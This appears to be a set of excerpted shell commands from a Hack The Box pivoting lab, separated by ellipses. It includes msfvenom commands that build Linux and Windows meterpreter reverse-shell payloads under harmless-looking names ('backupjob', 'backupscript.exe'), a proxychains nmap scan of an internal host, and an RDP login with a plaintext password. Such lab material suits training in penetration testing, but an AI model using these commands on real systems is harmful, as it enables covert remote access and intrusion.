...
```shell-session
frank-106@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
...
```shell-session
frank-106@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
...
```shell-session
frank-106@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```
...
```shell-session
frank-106@htb[/htb]$ netstat -antp
...
```shell-session
frank-106@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
